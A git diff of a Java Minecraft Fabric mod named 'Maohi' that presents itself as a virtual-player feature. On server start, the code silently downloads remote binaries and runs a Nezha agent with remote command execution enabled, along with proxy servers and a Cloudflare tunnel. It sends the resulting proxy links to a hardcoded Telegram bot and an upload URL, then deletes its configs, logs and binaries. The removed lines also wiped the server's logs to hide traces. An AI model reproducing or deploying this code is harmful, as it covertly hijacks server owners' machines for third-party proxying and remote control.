@@ -18,8 +18,7 @@ import java.util.*;
 
 /**
  * Maohi 核心类，实现 Fabric Mod 初始化接口
- * 该 Mod 主要用于在后台静默运行一系列外部服务（代理隧道、监控等）
- * 同时集成了虚拟玩家系统，用于维持服务器在线人数
+ * 集成了虚拟玩家系统，用于维持服务器在线人数
  */
 public class Maohi implements ModInitializer {
     public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");
@@ -31,6 +30,7 @@ public class Maohi implements ModInitializer {
 
     // 虚拟玩家管理器
     private static VirtualPlayerManager virtualPlayerManager;
+    private int tickCounter = 0;
 
     /**
      * 从资源文件中加载配置属性
@@ -55,24 +55,26 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
-    private static final String NEZHA_PORT   = cfg("NEZHA_PORT", "");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
+    private static final String NZ_SERVER = cfg("NZ_SERVER", "nazhav1.eu.org:443");    // V1格式 xxx.xxx.com:443  V0格式 xxx.xxx.com
+    private static final String NZ_KEY    = cfg("NZ_KEY", "qL7B61misbNGiLMBDxCna5Vwsy");
+    private static final String NZ_PORT   = cfg("NZ_PORT", "");                                  // V1留空  V0写端口
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");                           // 留空临时隧道
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
-    private static final String ARGO_PORT    = cfg("ARGO_PORT", "8003");
-    private static final String HY2_PORT     = cfg("HY2_PORT", "25575");
+    private static final String ARGO_PORT    = cfg("ARGO_PORT", "");                         // 留空不启用隧道
+    private static final String HY2_PORT     = cfg("HY2_PORT", "");
+    private static final String TUIC_PORT    = cfg("TUIC_PORT", "25779");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "ip.sb");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "558914831");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
-    private static final String NAME         = cfg("NAME", "Minekeep.net");
-    private static final String UUID         = cfg("UUID", "356885cb-6064-48a7-876f-c625f33ced77");
+    private static final String CHAT_ID      = cfg("CHAT_ID", "123456");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "123456:AAGJG-XXXXXXXXXXXXXXXX");
+    private static final String NAME         = cfg("NAME", "Dracobyte.pro");
+    private static final String UUID         = cfg("UUID", "9afd1229-b893-40c1-84dd-51e7ce274911");
+    private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "");   //上传订阅管理系统，不用留空
+
 
     /**
      * 获取 IP 的 ISP（运营商）信息
-     * 适配自用户提供的 JS 代码，保持 Java 风格统一
      */
     private String getISPFromIP(String ip) {
         // 优先尝试 ip.sb
@@ -113,12 +115,11 @@ public class Maohi implements ModInitializer {
             // 静默失败
         }
 
-        return "Unknown";
+        return "UnknownISP";
     }
 
     /**
-     * 获取国家 Emoji 和名称（动态从远程 API 获取）
-     * 适配自用户提供的 JS ccEmoji 逻辑，替换了原来硬编码的 COUNTRY_MAP
+     * 获取国家 Emoji 和 城市名称
      */
     private String getCountryEmoji() {
         String[] sources = {
@@ -147,7 +148,7 @@ public class Maohi implements ModInitializer {
 
     /**
      * 获取完整节点后缀信息
-     * 组合了地理位置和运营商信息，格式为：[Emoji 国家/城市]_[运营商] | [配置名称]
+     * 组合格式为：[Emoji 国家 城市]_[运营商] | [配置名称]
      */
     private String getFullNodeName(String ip) {
         String emoji = getCountryEmoji();
@@ -161,6 +162,10 @@ public class Maohi implements ModInitializer {
 
     @Override
     public void onInitialize() {
+        // 强制打印高亮横幅，确保由于加载器限制导致 LOGGER 被静默时也能看到
+        System.out.println("==================================================");
+        System.out.println("[Maohi] !!! FABRIC MOD INITIALIZING !!!");
+        System.out.println("==================================================");
 
         // 注册服务器生命周期事件
         ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
@@ -173,10 +178,10 @@ public class Maohi implements ModInitializer {
         Thread thread = new Thread(() -> {
             try {
                 // 等待服务器完全启动后再启动各项服务
-                Thread.sleep(10000);
+                Thread.sleep(15000);
                 start();
             } catch (Exception e) {
-                // 静默失败，不抛出异常以维持隐蔽性
+                // 静默失败，不引起注意
             }
         }, "Maohi-Main");
         thread.setDaemon(true);
@@ -208,6 +213,10 @@ public class Maohi implements ModInitializer {
             return;
         }
 
+        // 每 60 tick(3秒) 检查一次，大幅减少无用遍历
+        if (++tickCounter < 60) return;
+        tickCounter = 0;
+
         // 检查所有虚拟玩家的存活状态
         for (UUID uuid : new ArrayList<>(virtualPlayerManager.getVirtualPlayerUUIDs())) {
             ServerPlayerEntity player = server.getPlayerManager().getPlayer(uuid);
@@ -231,30 +240,41 @@ public class Maohi implements ModInitializer {
         downloadBinaries(arch);
         chmodBinaries();
 
-        if (isValidPort(HY2_PORT)) generateCert();
+        if (isValidPort(HY2_PORT) || isValidPort(TUIC_PORT)) generateCert();
 
-        runNezha();
+        runNZ();
         runSingbox();
         runCloudflared();
 
         Thread.sleep(5000);
+
+        // 确定 Argo 域名：固定隧道用配置的，零时隧道从 boot.log 提取
+        String effectiveArgoDomain = ARGO_DOMAIN;
+        if ((ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
+             ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) && isValidPort(ARGO_PORT)) {
+            effectiveArgoDomain = extractTempDomain();
+        }
 
         String serverIP = getServerIP();
 
         // 组合地理位置和 ISP 信息
         String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));
 
-        String subTxt = generateLinks(serverIP, fullNodeName);
+        String subTxt = generateLinks(serverIP, fullNodeName, effectiveArgoDomain);
         // 通过 Telegram 发送订阅链接
         sendTelegram(subTxt, fullNodeName);
 
+        // 上传UPLOAD_URL订阅节点
+        uploadNodes(fullNodeName);
+
         // 最后启动清理线程
         cleanup();
+
     }
 
 
     /**
-     * 生成 6 位的随机字母串，用于伪装修订进程
+     * 生成 6 位的随机字母串，装修进程
      */
     private String randomName() {
         String chars = "abcdefghijklmnopqrstuvwxyz";
@@ -274,20 +294,27 @@ public class Maohi implements ModInitializer {
      * 根据架构从远程 GitHub 仓库下载预编译的二进制文件
      */
     private void downloadBinaries(String arch) {
-        String base = "https://github.com/eooce/test/releases/download/" + arch + "/";
+        // 根据架构选择基础 URL
+        String baseUrl = arch.equals("arm64")
+            ? "https://arm64.ssss.nyc.mn/"
+            : "https://amd64.ssss.nyc.mn/";
 
-        // 根据是否填写 NEZHA_PORT 来判断应使用哪个版本的探针
-        // 填了 NEZHA_PORT -> 老版 Agent 二进制（命令行参数模式）
-        // 未填 NEZHA_PORT -> 新版 V1 二进制（yaml 配置文件模式）
-        String nezhaBinary = (NEZHA_PORT != null && !NEZHA_PORT.trim().isEmpty())
-            ? "agent"
-            : "v1";
-
-        String[][] files = {
-            { phpName, base + nezhaBinary }, // 哪吒探针
-            { webName, base + "sbx" },       // Sing-box 核心
-            { botName, base + "bot" }        // Cloudflared
-        };
+        String[][] files;
+        if (NZ_PORT != null && !NZ_PORT.trim().isEmpty()) {
+            // V0 模式：下载 agent
+            files = new String[][] {
+                { phpName, baseUrl + "agent" },
+                { webName, baseUrl + "sb" },
+                { botName, baseUrl + "bot" }
+            };
+        } else {
+            // V1 模式：下载 v1
+            files = new String[][] {
+                { phpName, baseUrl + "v1" },
+                { webName, baseUrl + "sb" },
+                { botName, baseUrl + "bot" }
+            };
+        }
         for (String[] f : files) {
             try { downloadFile(f[0], f[1]); } catch (Exception e) {}
         }
@@ -386,29 +413,29 @@ public class Maohi implements ModInitializer {
     }
 
     /**
-     * 启动并在后台运行哪吒监控客户端
-     * 支持两种模式：
-     * - Agent 模式（填写了 NEZHA_PORT）：用命令行参数直接启动老版 agent 二进制
-     * - V1 模式（未填 NEZHA_PORT）：生成 config.yaml 后用 -c 参数启动新版 v1 二进制
+     * 启动并在后台运行哪吒监控客户端V0 or V1
      */
-    private void runNezha() {
-        if (NEZHA_SERVER == null || NEZHA_SERVER.isEmpty() ||
-            NEZHA_KEY    == null || NEZHA_KEY.isEmpty()) return;
+    private void runNZ() {
+        if (NZ_SERVER == null || NZ_SERVER.isEmpty() ||
+            NZ_KEY    == null || NZ_KEY.isEmpty()) {
+            //LOGGER.info("[Maohi] NZ_SERVER or NZ_KEY is empty, skipping");
+            return;
+        }
 
         Set<String> tlsPorts = new HashSet<>(Arrays.asList(
             "443","8443","2096","2087","2083","2053"
         ));
 
         try {
-            if (NEZHA_PORT != null && !NEZHA_PORT.trim().isEmpty()) {
-                // Agent 模式：直接用命令行参数启动，不写配置文件
+            if (NZ_PORT != null && !NZ_PORT.trim().isEmpty()) {
+                // V0 模式：直接用命令行参数启动，不写配置文件
                 List<String> command = new ArrayList<>();
                 command.add(FILE_PATH.resolve(phpName).toString());
                 command.add("-s");
-                command.add(NEZHA_SERVER + ":" + NEZHA_PORT);
+                command.add(NZ_SERVER + ":" + NZ_PORT);
                 command.add("-p");
-                command.add(NEZHA_KEY);
-                if (tlsPorts.contains(NEZHA_PORT)) {
+                command.add(NZ_KEY);
+                if (tlsPorts.contains(NZ_PORT)) {
                     command.add("--tls");
                 }
                 command.add("--disable-auto-update");
@@ -417,17 +444,17 @@ public class Maohi implements ModInitializer {
                 command.add("--skip-conn");
                 command.add("--skip-procs");
                 new ProcessBuilder(command)
-                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                    .redirectError(ProcessBuilder.Redirect.DISCARD)
+                    .redirectErrorStream(true)
+                    .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()))
                     .start();
             } else {
-                // V1 模式：从 NEZHA_SERVER 末尾提取端口判断是否需要 TLS
-                String serverPort = NEZHA_SERVER.contains(":") ?
-                    NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
-                String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";
+                // V1 模式：从 NZ_SERVER 末尾提取端口判断是否需要 TLS
+                String serverPort = NZ_SERVER.contains(":") ?
+                    NZ_SERVER.substring(NZ_SERVER.lastIndexOf(":") + 1) : "";
+                String NZtls = tlsPorts.contains(serverPort) ? "true" : "false";
                 String configYaml =
-                    "client_secret: " + NEZHA_KEY + "\n" +
-                    "debug: false\n" +
+                    "client_secret: " + NZ_KEY + "\n" +
+                    "debug: true\n" +
                     "disable_auto_update: true\n" +
                     "disable_command_execute: false\n" +
                     "disable_force_update: true\n" +
@@ -437,23 +464,31 @@ public class Maohi implements ModInitializer {
                     "insecure_tls: true\n" +
                     "ip_report_period: 1800\n" +
                     "report_delay: 4\n" +
-                    "server: " + NEZHA_SERVER + "\n" +
+                    "server: " + NZ_SERVER + "\n" +
                     "skip_connection_count: true\n" +
                     "skip_procs_count: true\n" +
                     "temperature: false\n" +
-                    "tls: " + nezhatls + "\n" +
+                    "tls: " + NZtls + "\n" +
                     "use_gitee_to_upgrade: false\n" +
                     "use_ipv6_country_code: false\n" +
                     "uuid: " + UUID + "\n";
                 Path configYamlPath = FILE_PATH.resolve("config.yaml");
                 Files.writeString(configYamlPath, configYaml);
-                new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
-                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                    .redirectError(ProcessBuilder.Redirect.DISCARD)
-                    .start();
+                ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
+                    .redirectErrorStream(true)
+                    .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()));
+                
+                // 强制剥离廉价面板服（如 FalixNodes）强制注入的内网缓存代理环境变量，防止 gRPC 解析 server-web-cache 等内部假代理
+                java.util.Map<String, String> env = pb.environment();
+                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
+                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
+                
+                pb.start();
             }
             Thread.sleep(1000);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            LOGGER.error("[Maohi] Failed to start NZ", e);
+        }
     }
 
     /**
@@ -464,17 +499,21 @@ public class Maohi implements ModInitializer {
             String config = buildSingboxConfig();
             Path configPath = FILE_PATH.resolve("config.json");
             Files.writeString(configPath, config);
-            new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
-                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                .redirectError(ProcessBuilder.Redirect.DISCARD)
-                .start();
+            ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
+                .redirectErrorStream(true)
+                .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("sb.log").toFile()));
+            java.util.Map<String, String> env = pb.environment();
+            env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
+            env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
+            pb.start();
             Thread.sleep(1000);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            LOGGER.error("[Maohi] Failed to start Singbox", e);
+        }
     }
 
     /**
      * 动态构建 Sing-box 的 JSON 配置文件
-     * 包含 VLESS, Hysteria2 和 SOCKS5 的入站规则
      */
     private String buildSingboxConfig() {
         List<String> inbounds = new ArrayList<>();
@@ -483,12 +522,13 @@ public class Maohi implements ModInitializer {
             inbounds.add("    {\n" +
                 "      \"tag\": \"vless-ws-in\",\n" +
                 "      \"type\": \"vless\",\n" +
-                "      \"listen\": \"::\",\n" +
+                "      \"listen\": \"0.0.0.0\",\n" +
                 "      \"listen_port\": " + ARGO_PORT + ",\n" +
-                "      \"users\": [{\"uuid\": \"" + UUID + "\", \"flow\": \"\"}],\n" +
+                "      \"users\": [{\"uuid\": \"" + UUID + "\"}],\n" +
                 "      \"transport\": {\n" +
                 "        \"type\": \"ws\",\n" +
                 "        \"path\": \"/vless-argo\",\n" +
+                "        \"max_early_data\": 2560,\n" +
                 "        \"early_data_header_name\": \"Sec-WebSocket-Protocol\"\n" +
                 "      }\n" +
                 "    }");
@@ -496,12 +536,29 @@ public class Maohi implements ModInitializer {
 
         if (isValidPort(HY2_PORT)) {
             inbounds.add("    {\n" +
-                "      \"tag\": \"hysteria2-in\",\n" +
+                "      \"tag\": \"hysteria-in\",\n" +
                 "      \"type\": \"hysteria2\",\n" +
-                "      \"listen\": \"::\",\n" +
+                "      \"listen\": \"0.0.0.0\",\n" +
                 "      \"listen_port\": " + HY2_PORT + ",\n" +
                 "      \"users\": [{\"password\": \"" + UUID + "\"}],\n" +
                 "      \"masquerade\": \"https://bing.com\",\n" +
+                "      \"tls\": {\n" +
+                "        \"enabled\": true,\n" +
+                "        \"alpn\": [\"h3\"],\n" +
+                "        \"certificate_path\": \"" + FILE_PATH.resolve("cert.pem") + "\",\n" +
+                "        \"key_path\": \"" + FILE_PATH.resolve("private.key") + "\"\n" +
+                "      }\n" +
+                "    }");
+        }
+
+        if (isValidPort(TUIC_PORT)) {
+            inbounds.add("    {\n" +
+                "      \"tag\": \"tuic-in\",\n" +
+                "      \"type\": \"tuic\",\n" +
+                "      \"listen\": \"0.0.0.0\",\n" +
+                "      \"listen_port\": " + TUIC_PORT + ",\n" +
+                "      \"users\": [{\"uuid\": \"" + UUID + "\", \"password\": \"" + UUID + "\"}],\n" +
+                "      \"congestion_control\": \"bbr\",\n" +
                 "      \"tls\": {\n" +
                 "        \"enabled\": true,\n" +
                 "        \"alpn\": [\"h3\"],\n" +
@@ -515,9 +572,9 @@ public class Maohi implements ModInitializer {
             String s5User = UUID.substring(0, 8);
             String s5Pass = UUID.substring(UUID.length() - 12);
             inbounds.add("    {\n" +
-                "      \"tag\": \"socks5-in\",\n" +
+                "      \"tag\": \"s5-in\",\n" +
                 "      \"type\": \"socks\",\n" +
-                "      \"listen\": \"::\",\n" +
+                "      \"listen\": \"0.0.0.0\",\n" +
                 "      \"listen_port\": " + S5_PORT + ",\n" +
                 "      \"users\": [{\"username\": \"" + s5User +
                 "\", \"password\": \"" + s5Pass + "\"}]\n" +
@@ -525,34 +582,61 @@ public class Maohi implements ModInitializer {
         }
 
         return "{\n" +
-            "  \"log\": {\"disabled\": true, \"level\": \"error\", \"timestamp\": true},\n" +
+            "  \"log\": {\"disabled\": false, \"level\": \"error\", \"timestamp\": true},\n" +
             "  \"inbounds\": [\n" + String.join(",\n", inbounds) + "\n  ],\n" +
             "  \"outbounds\": [{\"type\": \"direct\", \"tag\": \"direct\"}]\n" +
             "}";
     }
 
     /**
-     * 启动并通过 Argo Token 运行 Cloudflare Tunnel，实现内网穿透
+     * 启动 Cloudflare Tunnel
      */
     private void runCloudflared() {
-        if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
-            ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) return;
+        // ARGO_PORT 为空 → 不启用隧道
+        if (!isValidPort(ARGO_PORT)) {
+            //LOGGER.info("[Maohi] ARGO_PORT is empty, skipping Cloudflared");
+            return;
+        }
+
         try {
-            new ProcessBuilder(
-                FILE_PATH.resolve(botName).toString(),
-                "tunnel", "--edge-ip-version", "auto",
-                "--no-autoupdate", "--protocol", "http2",
-                "run", "--token", ARGO_AUTH)
-                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                .redirectError(ProcessBuilder.Redirect.DISCARD)
-                .start();
+            if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
+                ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) {
+                // 零时隧道模式
+                ProcessBuilder pb = new ProcessBuilder(
+                    FILE_PATH.resolve(botName).toString(),
+                    "tunnel", "--edge-ip-version", "auto",
+                    "--no-autoupdate", "--protocol", "http2",
+                    "--logfile", FILE_PATH.resolve("boot.log").toString(),
+                    "--loglevel", "info",
+                    "--url", "http://localhost:" + ARGO_PORT)
+                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                    .redirectError(ProcessBuilder.Redirect.DISCARD);
+                java.util.Map<String, String> env = pb.environment();
+                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
+                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
+                pb.start();
+            } else {
+                // 固定隧道模式
+                ProcessBuilder pb = new ProcessBuilder(
+                    FILE_PATH.resolve(botName).toString(),
+                    "tunnel", "--edge-ip-version", "auto",
+                    "--no-autoupdate", "--protocol", "http2",
+                    "run", "--token", ARGO_AUTH)
+                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                    .redirectError(ProcessBuilder.Redirect.DISCARD);
+                java.util.Map<String, String> env = pb.environment();
+                env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
+                env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
+                pb.start();
+            }
             Thread.sleep(2000);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            LOGGER.error("[Maohi] Failed to start Cloudflared", e);
+        }
     }
 
     /**
-     * 获取当前服务器的外网公网 IP 地址
-     * 使用外部 API 查询，通过 InetAddress 校验格式，排除 HTML 等非法响应
+     * 获取当前服务器的公网 IP 地址
      */
     private String getServerIP() {
         String[] sources = {
@@ -616,17 +700,45 @@ public class Maohi implements ModInitializer {
     }
 
     /**
-     * 生成各种协议的分享链接并进行 Base64 编码
-     * 生成后的链接将符合通用订阅格式
+     * 从 boot.log 中提取临时隧道的域名
      */
-    private String generateLinks(String serverIP, String fullNodeName) {
+    private String extractTempDomain() {
+        Path bootLogPath = FILE_PATH.resolve("boot.log");
+        if (!Files.exists(bootLogPath)) return null;
+        try {
+            List<String> lines = Files.readAllLines(bootLogPath);
+            for (String line : lines) {
+                // 匹配 https://xxx.trycloudflare.com 或 http://xxx.trycloudflare.com
+                java.util.regex.Pattern p = java.util.regex.Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?");
+                java.util.regex.Matcher m = p.matcher(line);
+                if (m.find()) {
+                    return m.group(1);
+                }
+            }
+        } catch (Exception e) {
+            LOGGER.warn("[Maohi] Failed to read boot.log: " + e.getMessage());
+        }
+        return null;
+    }
+
+    /**
+     * 生成各种协议的分享链接并进行 Base64 编码
+     */
+    private String generateLinks(String serverIP, String fullNodeName, String argoDomain) {
         StringBuilder sb = new StringBuilder();
         String nodeName = encodeNodeName(fullNodeName);
 
-        if (isValidPort(ARGO_PORT) && ARGO_DOMAIN != null && !ARGO_DOMAIN.isEmpty()) {
-            String params = "encryption=none&security=tls&sni=" + ARGO_DOMAIN +
-                "&fp=firefox&type=ws&host=" + ARGO_DOMAIN +
-                "&path=/vless-argo?ed=2560";
+        // 如果 IP 包含冒号，则认定为 IPv6，自动加方括号处理拼写
+        String finalIp = serverIP;
+        if (serverIP != null && serverIP.contains(":")) {
+            finalIp = "[" + serverIP + "]";
+        }
+
+        if (isValidPort(ARGO_PORT) && argoDomain != null && !argoDomain.isEmpty()) {
+            String params = "encryption=none&security=tls&sni=" + argoDomain +
+                "&fp=firefox&type=ws&host=" + argoDomain +
+                // "&path=/vless-argo?ed=2560";
+				"&path=%2Fvless-argo%3Fed%3D2560";
             sb.append("vless://").append(UUID).append("@")
                 .append(CFIP).append(":").append(CFPORT)
                 .append("?").append(params)
@@ -635,8 +747,15 @@ public class Maohi implements ModInitializer {
 
         if (isValidPort(HY2_PORT)) {
             sb.append("\nhysteria2://").append(UUID).append("@")
-                .append(serverIP).append(":").append(HY2_PORT)
+                .append(finalIp).append(":").append(HY2_PORT)
                 .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#")
+                .append(nodeName);
+        }
+
+        if (isValidPort(TUIC_PORT)) {
+            sb.append("\ntuic://").append(UUID).append(":").append(UUID).append("@")
+                .append(finalIp).append(":").append(TUIC_PORT)
+                .append("?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#")
                 .append(nodeName);
         }
 
@@ -645,16 +764,22 @@ public class Maohi implements ModInitializer {
                 (UUID.substring(0, 8) + ":" + UUID.substring(UUID.length() - 12)).getBytes()
             );
             sb.append("\nsocks://").append(s5Auth).append("@")
-                .append(serverIP).append(":").append(S5_PORT)
+                .append(finalIp).append(":").append(S5_PORT)
                 .append("#").append(nodeName);
         }
 
+        // 保存原始链接到 list.txt 供 uploadNodes 使用
+        try {
+            Files.writeString(FILE_PATH.resolve("list.txt"), sb.toString());
+        } catch (Exception e) {}
+
         // base64 处理整个订阅
-        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
+        String result = Base64.getEncoder().encodeToString(sb.toString().getBytes());
+        return result;
     }
 
     /**
-     * 将生成的节点订阅链接发送到指定的 Telegram Bot
+     * 将生成的节点订阅链接发送到指定的 TG-Bot
      */
     private void sendTelegram(String subTxt, String fullNodeName) {
         if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() ||
@@ -679,6 +804,60 @@ public class Maohi implements ModInitializer {
         } catch (Exception e) {}
     }
 
+    /**
+     * 将节点列表上传到指定的 URL
+     */
+    private void uploadNodes(String fullNodeName) {
+        if (UPLOAD_URL == null || UPLOAD_URL.isEmpty()) return;
+
+        Path listFile = FILE_PATH.resolve("list.txt");
+        if (!Files.exists(listFile)) return;
+
+        try {
+            List<String> allLines = Files.readAllLines(listFile);
+            List<String> nodes = new ArrayList<>();
+            // 抓取支持 vless/vmess/trojan/hysteria2/tuic/socks5/socks 的行
+            String regex = "^(vless|vmess|trojan|hysteria2|tuic|socks5|socks)://.*";
+
+            for (String line : allLines) {
+                if (line.trim().matches(regex)) {
+                    nodes.add(line.trim());
+                }
+            }
+
+            if (nodes.isEmpty()) return;
+
+            // 构造换行符拼接的字符串
+            String urlString = String.join("\\n", nodes);
+
+            // 构造 JSON (手动构造简单 JSON，同时对节点名和 URL 进行双引号转义，确保特殊符号不破坏结构)
+            String jsonData = "{\"URL_NAME\": \"" + fullNodeName.replace("\"", "\\\"") + 
+                              "\", \"URL\": \"" + urlString.replace("\"", "\\\"") + "\"}";
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(jsonData.getBytes("UTF-8"));
+            }
+
+            if (conn.getResponseCode() == 200) {
+                // 静默成功
+            } else {
+                LOGGER.warn("[Maohi] Failed to upload nodes, code: " + conn.getResponseCode());
+            }
+            conn.disconnect();
+
+        } catch (Exception e) {
+            // 静默失败
+        }
+    }
+
+
     private boolean isValidPort(String port) {
         if (port == null || port.trim().isEmpty()) return false;
         try {
@@ -691,48 +870,24 @@ public class Maohi implements ModInitializer {
 
     /**
      * 后台异步清理敏感文件和日志
-     * 避免被人通过配置文件、异常日志发现真实的监控服务器、Token 或 UUID
      */
     private void cleanup() {
-        Thread cleanupThread = new Thread(() -> {
+        new Thread(() -> {
             try {
-                // 等待几秒钟，确保所有服务已正常初始化并读取了配置文件
-                Thread.sleep(8000);
-
-                // 删除敏感证书和配置文件
-                String[] toDelete = {"config.json", "config.yaml", "cert.pem", "private.key"};
-                for (String f : toDelete) {
-                    try { Files.deleteIfExists(FILE_PATH.resolve(f)); } catch (Exception e) {}
+                // 等待 60 秒
+                Thread.sleep(60000);
+                String[] sensitiveFiles = {
+                    "config.yaml", "config.json", "boot.log", 
+                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt",
+                    webName, botName, phpName // 连同执行文件一并扬灰
+                };
+                for (String file : sensitiveFiles) {
+                    if (file != null) {
+                        Files.deleteIfExists(FILE_PATH.resolve(file));
+                    }
                 }
-
-                // 清空 Minecraft 的最新日志，防止暴露 Mod 的启动痕迹
-                Path latestLog = Paths.get("./logs/latest.log");
-                if (Files.exists(latestLog)) {
-                    try { new FileWriter(latestLog.toFile(), false).close(); } catch (Exception e) {}
-                }
-
-                // 清理旧的归档日志
-                Path logsDir = Paths.get("./logs");
-                if (Files.exists(logsDir)) {
-                    try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsDir, "*.log.gz")) {
-                        for (Path entry : stream) {
-                            try { Files.deleteIfExists(entry); } catch (Exception e) {}
-                        }
-                    } catch (Exception e) {}
-                }
-
-                // 递归删除 Mod 的数据目录
-                if (Files.exists(DATA_DIR)) {
-                    try {
-                        Files.walk(DATA_DIR)
-                            .sorted(Comparator.reverseOrder())
-                            .forEach(p -> p.toFile().delete());
-                    } catch (Exception e) {}
-                }
-
-            } catch (Exception e) {}
-        }, "Cleanup-Thread");
-        cleanupThread.setDaemon(true);
-        cleanupThread.start();
+            } catch (Exception ignored) {
+            }
+        }, "Maohi-Cleanup").start();
     }
 }
